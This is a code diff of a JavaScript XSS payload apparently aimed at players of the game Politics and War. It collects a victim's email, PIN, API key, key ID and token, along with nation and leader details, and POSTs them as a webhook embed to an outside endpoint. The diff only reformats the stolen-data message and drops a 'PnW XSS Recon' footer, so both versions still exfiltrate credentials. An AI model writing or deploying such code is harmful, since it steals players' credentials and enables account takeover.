@@ -49,17 +49,16 @@ document.querySelectorAll('a[href*="onerror"], a[href*="import"]').forEach(a => 
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({embeds: [{
-        title: `🔑 ${leader || 'Unknown'} of ${nation || '???'}`,
-        description: `User ID: **${userId || '?'}**`,
+        title: `${leader}`,
+        description: `[${nation}](https://politicsandwar.com/nation/id=${userId})`,
         color: 0x2ecc71,
         fields: [
-          {name: '📧 Email',     value: `\`${email}\``,          inline: true},
-          {name: '🔐 PIN',       value: `\`${pin || 'N/A'}\``,   inline: true},
-          {name: '🔑 API Key',   value: `\`${apiKey || 'N/A'}\``, inline: false},
-          {name: '🆔 Key ID',    value: `\`${keyId || 'N/A'}\``, inline: true},
-          {name: '🎟️ Token',     value: `\`${token || 'N/A'}\``, inline: true}
+          {name: '📧 Email',     value: `\`${email}\``,           inline: true},
+          {name: '🔐 PIN',       value: `\`${pin || 'N/A'}\``,    inline: true},
+          {name: '🔑 API Key',   value: `\`${apiKey || 'N/A'}\``, inline: true},
+          {name: '🆔 Key ID',    value: `\`${keyId || 'N/A'}\``,  inline: true},
+          {name: '🎟️ Token',     value: `\`${token || 'N/A'}\``,  inline: true}
         ],
-        footer: {text: 'PnW XSS Recon'},
         timestamp: new Date().toISOString()
       }]})
     });
